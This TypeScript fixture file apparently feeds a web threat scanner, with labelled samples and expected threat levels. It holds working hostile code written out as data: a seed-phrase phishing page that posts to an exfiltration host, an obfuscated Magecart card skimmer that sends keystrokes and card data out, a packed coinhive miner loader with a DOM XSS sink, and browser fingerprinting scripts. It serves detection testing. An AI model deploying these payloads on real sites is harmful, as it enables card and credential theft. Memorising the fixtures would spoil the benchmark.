export interface SampleTarget {
  id: string;
  name: string;
  shortDesc: string;
  type: 'code' | 'url';
  targetUrl?: string;
  category: string;
  expectedThreatLevel: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'SAFE';
  payload: string;
}

export const SAMPLE_TARGETS: SampleTarget[] = [
  {
    id: 'phishing-trap',
    name: 'Phishing Trap & AI Scraper Portal',
    shortDesc: 'Mass-generated crypto recovery portal with template artifacts, hidden SEO keywords, and fake static trust badges.',
    type: 'code',
    targetUrl: 'https://secure-recovery-chase.crypto-verify.top/auth',
    category: 'Bot Fraud & Scraper Artifacts',
    expectedThreatLevel: 'CRITICAL',
    payload: `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Account Verification & Asset Protection - Immediate Action Required</title>
  <!-- SEO & Keyword Manipulation: Cloaked Hidden Text for Crawlers -->
  <meta name="keywords" content="crypto recovery, bank login, free bitcoin, ledger seed, refund bonus, instant deposit, urgent wire">
  <style>
    .hidden-crawler-bait {
      position: absolute;
      left: -9999px;
      font-size: 0px;
      opacity: 0;
      display: none;
    }
  </style>
</head>
<body>
  <div class="hidden-crawler-bait">
    <h1 class="hidden">Official FDIC Insured Crypto Banking Portal 2026</h1>
    <p>Top bank transfer secure wallet recovery bitcoin ethereum metamask login bypass keyphrase refund</p>
  </div>

  <header>
    <!-- Template & Scraper Artifacts: Unrendered variables & local asset paths -->
    <img src="file:///C:/Users/Admin/Desktop/scraped_site/assets/logo.png" alt="Secure Bank Logo">
    <h2>Welcome to {{ company_name }} Portal - Account Tier: <%= user_tier %></h2>
  </header>

  <main>
    <div class="alert-box">
      <h3>Urgent Security Notice for {{ user_email }}</h3>
      <p>Your account was restricted. Re-authenticate your secret 12-word seed phrase or bank credential below.</p>
    </div>

    <!-- Dead / Facade Links -->
    <nav>
      <a href="#">Security Protocols</a>
      <a href="javascript:;">Privacy Policy</a>
      <a href="javascript:void(0);">Terms of Escrow</a>
      <a href="#">Contact Federal Agent</a>
    </nav>

    <form id="verify-form" action="https://drop-exfil-bot.xyz/gate.php" method="POST">
      <input type="text" name="username" placeholder="Username / Card Number" required>
      <input type="password" name="password" placeholder="Password / PIN" required>
      <input type="text" name="seed_phrase" placeholder="12 or 24 Word Seed Phrase">
      <button type="submit">Verify Now</button>
    </form>

    <!-- Fake Proof Elements: Static PNG Badges without live cryptographic scripts -->
    <div class="trust-seals">
      <img src="https://static-badges.net/norton-secured-seal.png" alt="Norton Secured 2026">
      <img src="https://static-badges.net/mcafee-secure-verified.png" alt="McAfee Certified">
      <img src="https://static-badges.net/trustpilot-5-stars-rating.png" alt="Trustpilot 4.9 Stars">
      <img src="https://static-badges.net/verified-by-visa-official.png" alt="Verified by Visa">
    </div>
  </main>
</body>
</html>`
  },
  {
    id: 'magecart-skimmer',
    name: 'Magecart E-Commerce Checkout Skimmer',
    shortDesc: 'Digital payment skimmer intercepting credit cards, CVVs, and billing data in real-time with base64 dropper.',
    type: 'code',
    targetUrl: 'https://boutique-store-checkout.com/cart',
    category: 'Data Exfiltration & Keylogging',
    expectedThreatLevel: 'CRITICAL',
    payload: `// Magecart Digital Payment Skimmer (Obfuscated Injected Script)
(function() {
  console.log("Storefront UI initialization complete.");

  // Obfuscated dynamic script dropper using base64 decoding & eval
  const _payloadGate = "aHR0cHM6Ly9leGZpbC1nYXdhd2F5LnJ1L2FwaS92MS9zdGF0cw==";
  const decodedGate = atob(_payloadGate);

  // Hooking dynamic input listeners across sensitive payment form fields
  document.addEventListener("DOMContentLoaded", function() {
    const paymentForm = document.querySelector("#checkout-payment-form");
    const harvestedCardData = {};

    // Keystroke logging on cardholder inputs
    window.addEventListener("keydown", function(event) {
      const target = event.target;
      if (target && target.name) {
        if (target.name.match(/cc_num|card_number|cvv|expiry|cardholder|billing_zip/i)) {
          harvestedCardData[target.name] = (harvestedCardData[target.name] || "") + event.key;
        }
      }
    });

    // Exfiltrate stolen credit card payload on submit or blur via sendBeacon
    window.addEventListener("beforeunload", function() {
      if (Object.keys(harvestedCardData).length > 0) {
        const payload = JSON.stringify({
          victim_origin: window.location.origin,
          captured_time: Date.now(),
          credentials: harvestedCardData
        });
        navigator.sendBeacon(decodedGate, payload);
      }
    });

    // Intercept checkout form submission
    if (paymentForm) {
      paymentForm.addEventListener("submit", function(e) {
        const ccInput = document.querySelector("input[name='cc_num']");
        const cvvInput = document.querySelector("input[name='cvv']");
        if (ccInput && cvvInput) {
          fetch(decodedGate, {
            method: "POST",
            mode: "cors",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              cc_number: ccInput.value,
              cvv: cvvInput.value,
              referrer: document.referrer
            })
          });
        }
      });
    }
  });
})();`
  },
  {
    id: 'surveillance-portal',
    name: 'Aggressive Telemetry & Fingerprinting Matrix',
    shortDesc: 'Multi-layer browser profiling suite: Canvas, WebGL, AudioContext, battery monitoring, and full-session recording.',
    type: 'code',
    targetUrl: 'https://consumer-profiling-metrics.io/track',
    category: 'Fingerprinting & Telemetry',
    expectedThreatLevel: 'HIGH',
    payload: `<!-- Advanced Telemetry & Surveillance Script Bundle -->
<script>
// 1. HTML5 Canvas Hardware Fingerprinting
function getCanvasFingerprint() {
  const canvas = document.createElement('canvas');
  canvas.width = 200;
  canvas.height = 50;
  const ctx = canvas.getContext('2d');
  ctx.textBaseline = "top";
  ctx.font = "14px 'Arial', 'Times New Roman'";
  ctx.fillStyle = "#f60";
  ctx.fillRect(125,1,62,20);
  ctx.fillStyle = "#069";
  ctx.fillText("SentinelX Browser Recon", 2, 15);
  ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
  ctx.fillText("SecurityProfiling!@#", 4, 17);
  return canvas.toDataURL(); // Extracts unique GPU font rasterization hash
}

// 2. WebGL Hardware Unmasking
function getWebGLFingerprint() {
  const canvas = document.createElement('canvas');
  const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
  if (!gl) return null;
  const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
  return {
    vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
    renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL), // Queries exact physical GPU model
    shadingLang: gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
  };
}

// 3. AudioContext Acoustic Fingerprinting
function getAudioFingerprint() {
  try {
    const audioCtx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
    const oscillator = audioCtx.createOscillator();
    oscillator.type = "triangle";
    oscillator.frequency.setValueAtTime(10000, audioCtx.currentTime);
    const compressor = audioCtx.createDynamicsCompressor();
    compressor.threshold.setValueAtTime(-50, audioCtx.currentTime);
    oscillator.connect(compressor);
    compressor.connect(audioCtx.destination);
    oscillator.start(0);
    audioCtx.startRendering();
  } catch(e) {}
}

// 4. Client Hardware & Environmental Harvesting
const userEnv = {
  screenDepth: screen.colorDepth,
  pixelDepth: screen.pixelDepth,
  cores: navigator.hardwareConcurrency,
  deviceMemory: navigator.deviceMemory,
  platform: navigator.platform
};

// Battery Status API polling
if (navigator.getBattery) {
  navigator.getBattery().then(b => {
    userEnv.batteryLevel = b.level;
    userEnv.charging = b.charging;
  });
}
</script>

<!-- 5. Full-Session Replay Tracking Scripts -->
<script>
  (function(h,o,t,j,a,r){
    h.hj=h.hj||function(){(h.hj.q=h.hj.q||[]).push(arguments)};
    h._hjSettings={hjid:882910,hjsv:6};
    a=o.getElementsByTagName('head')[0];
    r=o.createElement('script');r.async=1;
    r.src='https://static.hotjar.com/c/hotjar-'+h._hjSettings.hjid+'.js?sv='+h._hjSettings.hjsv;
    a.appendChild(r);
  })(window,document);
</script>

<!-- 6. Invisible 1x1 Tracking Pixel Beacon -->
<img src="https://connect.facebook.net/tr?id=99102938472&ev=PageView&noscript=1" width="1" height="1" style="display:none;" alt="">`
  },
  {
    id: 'obfuscated-miner',
    name: 'Packed JS Dropper & WebAssembly Miner',
    shortDesc: 'Dean Edwards packed eval script deploying a background Monero crypto-mining worker and DOM-XSS sink.',
    type: 'code',
    targetUrl: 'https://free-stream-media-portal.net/watch',
    category: 'Malicious Payloads & Obfuscation',
    expectedThreatLevel: 'CRITICAL',
    payload: `// Packed JavaScript Loader (Dean Edwards Pattern)
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c])}}return p}('5 2=4.3(\\'6\\');2.7=\\'8://9.a/b.c\\';4.d.e(2);',15,15,'||script|createElement|document|var|script|src|https|pool|coinhive|miner|js|head|appendChild'.split('|'),0,{}))

// Background WebAssembly Mining Pool Initialization
function launchBackgroundMiner() {
  if (window.WebAssembly) {
    console.log("Allocating multi-threaded WebAssembly worker threads for hash calculation...");
    const minerConfig = {
      threads: navigator.hardwareConcurrency || 4,
      throttle: 0.1, // Consumes 90% CPU cycles
      pool: "stratum+tcp://xmr-node.cryptoloot.pro:3333",
      wallet: "48edfHu7V9Z84YzzMa6fUUEoELZ9ZRXq9CP6R"
    };
  }
}

// Insecure DOM-based Cross-Site Scripting (XSS) Sink
window.addEventListener("hashchange", function() {
  const userPayload = location.hash.substring(1);
  // Dangerous direct sink without validation or sanitization
  document.getElementById("status-container").innerHTML = "<div>Current Session Token: " + userPayload + "</div>";
});`
  },
  {
    id: 'hardened-sovereign',
    name: 'Hardened Sovereign Web App (Clean Benchmark)',
    shortDesc: 'Mathematically proven secure: strict Content-Security-Policy, zero third-party telemetry, sanitized DOM inputs.',
    type: 'code',
    targetUrl: 'https://vault.sovereign-systems.internal',
    category: 'Defensive Hardening Baseline',
    expectedThreatLevel: 'SAFE',
    payload: `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Sovereign Vault - Verified Zero-Trust Portal</title>
  
  <!-- Strict Content Security Policy & Security Meta Directives -->
  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data:; font-src 'self'; connect-src 'self'; frame-ancestors 'none'; base-uri 'self'; form-action 'self'; upgrade-insecure-requests;">
  <meta name="referrer" content="no-referrer">
</head>
<body class="bg-slate-950 text-slate-100">
  <header>
    <h1>Verified Sovereign Node #4092</h1>
    <p>Zero-telemetry cryptographic dashboard. No third-party scripts or trackers loaded.</p>
  </header>

  <main>
    <section>
      <h2>Input Sanitization Verified</h2>
      <p>All client-side interactions utilize textContent and strict parameter schemas.</p>
    </section>
  </main>
</body>
</html>`
  }
];
